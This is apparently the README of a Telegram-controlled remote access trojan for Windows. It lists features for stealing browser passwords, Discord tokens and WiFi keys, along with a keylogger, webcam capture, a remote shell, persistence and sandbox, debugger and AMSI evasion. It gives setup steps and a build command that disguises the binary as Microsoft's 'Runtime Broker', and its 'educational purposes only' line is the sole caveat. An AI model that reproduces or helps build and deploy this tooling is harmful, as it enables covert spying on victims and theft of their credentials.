# Telegram RAT

Remote Access Tool with Telegram C2.

## Features

- System information + geolocation
- Screenshot / Webcam
- Keylogger (ON/OFF/Dump)
- Browser passwords (Chrome, Edge, Brave, Opera, Opera GX, Vivaldi, Yandex) with App-Bound Encryption support
- Discord tokens
- WiFi passwords
- Clipboard monitor
- File grabber
- Remote shell
- File download / upload
- MessageBox
- Persistence (Registry Run + Startup + Task Scheduler)
- Self-destruct
- Anti-analysis (sandbox, VM, debugger, AMSI/ETW, startup delay)

## Structure

```
rat.py              # entry point
modules/
  config.py         # obfuscated config
  state.py          # runtime state
  anti.py           # anti-analysis
  stealers.py       # passwords, discord, wifi, files
  system.py         # keylogger, clipboard, persist, screenshot, cam
  main.py           # bot handlers
```

## Requirements

- Windows 10/11
- Python 3.10+

## Install

```bash
pip install pyTelegramBotAPI pynput mss opencv-python requests psutil pywin32 pycryptodome
pip install nuitka ordered-set zstandard
```

## Setup

1. Create bot via @BotFather, get token.
2. Get your numeric ID via @userinfobot.
3. Edit `encrypt.py`:
```python
TOKEN = "123456:AAHxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
ADMIN = "987654321"
```
4. Run:
```bash
python encrypt.py
```
5. Paste the output into `modules/config.py` replacing the `PASTE_HERE` values.

## Build

```bash
nuitka ^
  --standalone ^
  --onefile ^
  --windows-disable-console ^
  --windows-company-name="Microsoft Corporation" ^
  --windows-product-name="Runtime Broker" ^
  --windows-file-description="Runtime Broker" ^
  --windows-file-version=10.0.19041.1 ^
  --windows-product-version=10.0.19041.1 ^
  --windows-icon-from-ico=icon.ico ^
  --enable-plugin=anti-bloat ^
  --assume-yes-for-downloads ^
  --remove-output ^
  --lto=yes ^
  --mingw64 ^
  --include-package=Crypto ^
  --include-package=modules ^
  rat.py
```

## Usage

Run the binary. You will receive an "online" message with the control keyboard in Telegram.

## Commands

| Button | Action |
|--------|--------|
| Info | System information |
| Screen | Screenshot |
| Cam | Webcam photo |
| KL ON/OFF | Keylogger |
| Dump KL | Dump keylogger buffer |
| Passwords | Steal browser passwords |
| Discord | Steal Discord tokens |
| WiFi | Steal WiFi passwords |
| Clip ON/OFF | Clipboard monitor |
| Grab | Grab interesting files |
| Shell | Remote command |
| Download | Download file |
| Upload | Upload file |
| Msg | MessageBox |
| Persist | Add to startup |
| Kill | Self-destruct |

## Notes

- Chromium passwords require the user to be logged in (DPAPI / ABE).
- Persistence is user-level + Task Scheduler.
- Startup has a random delay (8-20s) before network activity.
- For educational and research purposes only.
